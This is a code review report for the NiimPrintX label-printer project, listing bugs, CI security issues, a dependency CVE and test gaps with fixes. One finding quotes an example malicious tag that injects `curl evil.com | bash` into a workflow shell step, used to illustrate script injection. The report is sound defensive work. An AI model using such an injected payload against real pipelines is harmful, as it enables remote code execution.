# NiimPrintX Round 17 — Deep Code Review Report

**Date**: 2026-04-12
**Method**: 25-agent parallel burn (Opus 4.6)
**Scope**: Full codebase — 50 Python files, 8.8K LOC, 6 workflows, 6 PyInstaller specs

---

## Executive Summary

25 specialized agents reviewed the entire NiimPrintX codebase across 7 domains: core library, UI layer, CLI, CI/CD, testing, security, and modernization. After deduplication, we found **6 CRITICAL**, **22 HIGH**, **30 MEDIUM**, and **15+ LOW** findings. The most impactful issues are image corruption bugs, thread-safety races, CI security vulnerabilities, and a vulnerable dependency.

---

## CRITICAL (6)

### C1. Cairo stride padding corrupts exported images for non-aligned widths
- **File**: `ui/widget/PrintOption.py:224-225`
- **Agent**: 7 (Image Pipeline) | **Confidence**: 97%
- **Issue**: `Image.frombuffer("RGBA", ..., image_bytes, "raw", "BGRA", 0, 1)` passes stride=0, meaning "tightly packed." Cairo pads rows to alignment boundaries via `get_stride()`. When `bbox_width * 4` doesn't match Cairo's stride, every row after the first is shifted, producing sheared/corrupted label images.
- **Fix**: Use `stride = cropped_surface.get_stride()` and pass it to `frombuffer`. Also copy data to `bytes()` before `finish()` (see C6).

### C2. Alpha channel not composited before 1-bit conversion — transparent PNGs print wrong
- **File**: `nimmy/printer.py:307-313`
- **Agent**: 7 (Image Pipeline) | **Confidence**: 95%
- **Issue**: `_encode_image` does `image.convert("L")` which ignores alpha. Transparent regions (alpha=0) carry arbitrary RGB values, producing random dots. The UI path composites onto white via Cairo, but the **CLI path sends raw RGBA PNGs directly** to `_encode_image`.
- **Fix**: Composite alpha onto white background before grayscale conversion when mode is RGBA/LA/PA.

### C3. Thread-safety race: `config.printer_connected` written from asyncio thread
- **File**: `ui/widget/PrinterOperation.py:19,21,26,34,38`
- **Agent**: 9 (PrinterOperation) | **Confidence**: 90%
- **Issue**: `printer_connect/disconnect/heartbeat` write `config.printer_connected` from the asyncio thread while `PrintOption` reads/writes it from the Tkinter main thread. Can cause button state to flip incorrectly after connect, or heartbeat to reset connected state.
- **Fix**: Remove all `config.printer_connected` writes from `PrinterOperation`. Return success/failure and let `_update_device_status` (which runs on the Tkinter thread) manage the flag.

### C4. Script injection in all 3 build workflows via `${{ }}` in `run:` steps
- **File**: `.github/workflows/_build-{linux,macos,windows}.yaml`
- **Agent**: 15 (Workflows) | **Confidence**: 90%
- **Issue**: Tag version and architecture outputs are interpolated directly into `run:` shell scripts. A malicious tag like `v1.0"; curl evil.com | bash; echo "` gets executed. Affects all Validate tag steps and tar/zip creation steps.
- **Fix**: Use `env:` context to pass outputs into run scripts: `env: VERSION: ${{ steps.get_tag_name.outputs.VERSION }}` then reference `$VERSION` in the script.

### C5. setuptools 69.5.1 in poetry.lock — CVE-2025-47273 (CVSS 8.8)
- **File**: `poetry.lock`
- **Agent**: 17 (Config) | **Confidence**: 100%
- **Issue**: Path traversal vulnerability allowing arbitrary file write. Affects all CI/build pipelines that install from this lock file.
- **Fix**: `poetry update setuptools` to pull 78.1.1+.

### C6. macOS runtime hook is redundant AND copies entire bundle on every launch
- **File**: `runtime_hooks/macOS/runtime_hook.py`
- **Agent**: 16+18 (Specs + DMG) | **Confidence**: 92%
- **Issue**: The hook copies all of `sys._MEIPASS` to `~/.NiimPrintX_bundled/` using unreliable mtime comparison. Meanwhile, `__main__.py:load_libraries()` already sets `MAGICK_HOME` directly from `_MEIPASS`, overwriting the hook's value. The copy is never used.
- **Fix**: Remove the runtime hook entirely. `load_libraries()` handles everything.

---

## HIGH (22)

### Core Library
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H1 | `printer.py:278-280` | `page_started` flag not cleared after clean `end_page_print` — cleanup sends duplicate END_PAGE_PRINT | 1 |
| H2 | `bluetooth.py:103-106` | `stop_notification` leaves UUID stuck in tracking set when `stop_notify` raises — breaks all subsequent commands | 3 |
| H3 | `printer.py:313` | No `dither=NONE` option — Floyd-Steinberg degrades text/barcode/QR output on thermal printer | 7 |
| H4 | `printer.py:458-460` | `set_label_density` validates 1-5 for all models but density cap only enforced in CLI — library callers can exceed hardware max | 1+5 |

### UI Layer
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H5 | `__main__.py:48-63` | Zombie Tk root + visible splash on `load_resources()` failure; double-destroy on missing splash asset | 8+12 |
| H6 | `main.py:106` | `on_close` guard uses `and` instead of `or` — partial-init state reaches shutdown dialog | 8 |
| H7 | `PrintOption.py:410-440` | Auto-reconnect inside print job never updates connect button — stuck showing "Connect" | 9 |
| H8 | `PrintOption.py:373-408` | No cancel mechanism for in-progress print; connect button remains enabled allowing concurrent disconnect | 9 |
| H9 | `FontList.py:30` + `TextTab.py:15` | `fonts()` blocks UI thread for up to 10s during subprocess font enumeration (no background thread) | 11 |
| H10 | `ImageOperation.py:51-52` | Missing `image_id` guard in `start_image_resize` — potential KeyError | 10 |
| H11 | `TabbedIconGrid.py:159` | `canvas.after_idle()` on potentially-destroyed canvas not exception-guarded | 10 |

### CLI
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H12 | `command.py:96` | `d11_h` (300 DPI) width rejected by 203 DPI limit — valid images falsely rejected | 13 |

### CI/CD & Build
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H13 | `_build-windows.yaml:52-57` | ImageMagick download URL is version-pinned with no timeout/fallback | 15 |
| H14 | `tag.yaml:72` | `sha256sum *` silently corrupts checksums if any artifact is a directory | 15 |
| H15 | `tag.yaml:51` + `_build-linux.yaml:12` | Release/Linux jobs use `ubuntu-latest` inconsistently — affects glibc compat | 15 |
| H16 | `NiimPrintX-linux.spec:26-32` | TCL/TK paths hardcoded to Debian/Ubuntu — unbuildable on Fedora/Arch | 16 |
| H17 | `NiimPrintX-windows.spec:18` | No existence check for `./resources/ImageMagick` — silent build omission, runtime crash | 16 |
| H18 | `mac-dmg-builder.sh:31` | `pgrep XProtect` wait loop has no timeout — can hang for 6 hours | 18 |

### Logging
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H19 | `command.py:165,213` | `exc_info=True` is a no-op in loguru — CLI debug tracebacks silently dropped | 5+25 |

### Config
| # | File:Line | Issue | Agent |
|---|-----------|-------|-------|
| H20 | `pyproject.toml:15` | `<3.14` upper bound excludes Python 3.14 stable (released Oct 2025) | 17 |
| H21 | `pyproject.toml:61-67` | mypy strict overrides don't cover `ui.*` — 19 files have no type enforcement | 17 |
| H22 | `AppConfig.py:33+` | Built-in rotation `-90` vs user-config `270` — inconsistent canonical form in same dict | 12 |

---

## MEDIUM (30)

### Architecture & Coupling
- **types.py:28-55**: UI TypedDicts (`FontProps`, `TextItem`, `ImageItem`) in `nimmy` core — abstraction leak (Agent 4+6)
- **AppConfig**: God object passed to every widget — coupling entire UI through shared mutable state (Agent 6)
- **nimmy/__init__.py**: `V2_MODELS`, `MODEL_MAX_DENSITY` bypassed by direct imports from `printer.py` (Agent 6)
- **UserConfig.py:9**: Imports loguru directly instead of using `get_logger()` pattern (Agent 5+6)

### Bugs & Logic
- **printer.py:135-168**: Redundant `logger.error()` before re-raising creates duplicate error log lines (Agent 5)
- **printer.py:452-503**: `ValueError` from validation guards not caught as `PrinterException` — inconsistent API (Agent 5)
- **command.py:61-74**: Offset range not validated at CLI level — BLE scan wasted on bad input (Agent 13)
- **CanvasSelector.py:86-89**: Dead cleanup block — `font_image.close()` never executes (PhotoImage has no `.close()`) (Agent 10)
- **PrintOption.py:253-254**: Print density hardcoded to `min(3, max)` — silently low for B21 users (Agent 10)
- **SplashScreen.py:22-27**: Geometry computed while withdrawn — 1×1 window on Wayland compositors (Agent 12)
- **UserConfig.py:51-55**: Whole-float coercion in `_safe_int` is silent while fractional-float warns (Agent 12)

### Security
- **printer.py:76,82**: Log injection via unsanitized BLE device name at INFO level (Agent 23)
- **bin/process_png.py:28-30**: Option-injection via filename in mogrify call + S603/S607 unjustified (Agent 23)
- **__main__.py:53**: TOCTOU between `isfile` check and 100ms-delayed `load_from_file` (Agent 14+23)
- **PrintOption.py:224-227**: `get_data()` memoryview used after Cairo `finish()` — undefined behavior (Agent 7)

### CI/CD & Config
- **ci.yaml:34-35**: pyinstaller in dev deps pollutes audit scope (confirmed TODO H27) (Agent 15+17)
- **mac-dmg-builder.sh:50-68**: `kill_xprotect` runs unconditionally on every retry attempt (Agent 15+18)
- **mac-dmg-builder.sh:38-44**: `unmount_all_disks` detaches all disk images system-wide (Agent 18)
- **ruff.toml:5**: Missing `TC` (type-checking imports) rule set (Agent 17)
- **ruff.toml:5**: Missing `PLR` (Pylint Refactor) rules (Agent 17)
- **pyproject.toml:40-47**: No `branch = true` in coverage config (Agent 17)
- **pyproject.toml:46**: `widget/*.py` wildcard omit excludes testable `PrinterOperation.py` (Agent 17)
- **pyproject.toml:32**: pytest-asyncio `<1` cap + missing `asyncio_default_fixture_loop_scope` (Agent 17)
- **NiimPrintX-mac.spec:111-114**: Missing `NSHighResolutionCapable: True` — blurry on Retina (Agent 16)
- **NiimPrintX-mac.spec:38**: Bundles entire Homebrew ImageMagick prefix including headers/docs (Agent 16)

### Testing
- **8+ duplicated test scenarios** across files (Agent 19+21)
- **Logger state leaks** between tests — ordering-sensitive under `--randomly` (Agent 19)
- **sys._MEIPASS manipulation** leaks via bare `delattr` (Agent 19)
- **Divergent `_make_builtin()` helpers** — rotation -90 vs 270 (Agent 19)

### Modernization
- **All UI files**: Missing type annotations (Agent 25)
- **Multiple files**: `os.path` should be `pathlib` (Agent 25)

---

## Test Gap Analysis (15 Missing Scenarios)

### P1 — Critical Path
1. `_encode_image` effective-width overflow after positive horizontal_offset
2. `_encode_image` effective-height overflow (height + offset > 65535)
3. `send_command` when `char_uuid is None`
4. `_print_job` cleanup when `page_started=False` (skips `end_page_print`)
5. `PrinterOperation.print()` failure path (exception returns False)

### P2 — Important
6. `AppConfig.mm_to_pixels` — entirely untested pure function
7. `load_user_config` missing-file early return
8. `merge_label_sizes` non-dict `devices` value
9. `_validate_dims` with inf/nan inputs
10. `find_characteristics` multiple matching candidates
11. `start_notification` when not connected
12. `find_device` with nameless device in scan results

### P3 — Nice to Have
13. `_safe_int` with boolean input
14. `CanvasOperation.canvas_click_handler` hit-test branches
15. `PrinterOperation.printer_disconnect` exception path

---

## Dead Code
- **`ConfigException`** — defined, exported, tested, but never raised in production code
- **`ctx.obj["VERBOSE"]`** — written but never read in CLI subcommands
- **Duplicate `-v`/`-vv` levels** — both map to DEBUG identically
- **`path_fallback` flag** — over-engineered, always True in non-bundled branch

---

## False Positives Filtered
- Agent 18 C1 (missing DMG background image) — **file exists**, agent searched incorrectly
- Agent 18 C2 (`sudo create-dmg`) — downgraded, GitHub runners handle this

---

## Recommended Fix Order
1. **C5** — `poetry update setuptools` (1 minute, fixes CVE)
2. **C4** — Script injection in workflows (env context fix, ~30 min)
3. **C2** — Alpha compositing in `_encode_image` (~15 min, affects all CLI prints)
4. **C1** — Cairo stride fix in `export_to_png` (~10 min)
5. **C3** — Thread-safety: move `printer_connected` writes to Tkinter thread (~30 min)
6. **C6** — Delete runtime hook (~5 min)
7. **H1** — Clear `page_started` after clean end (~5 min)
8. **H2** — `stop_notification` try/finally for UUID cleanup (~5 min)
9. **H12** — `d11_h` width limit fix (~10 min)
10. **H19** — `exc_info=True` → `logger.opt(exception=True)` (~5 min)
11. **H5** — Splash double-destroy: use `splash.close()` (~5 min)
12. **H20** — Widen Python constraint to `<3.16` (~5 min, needs test run)
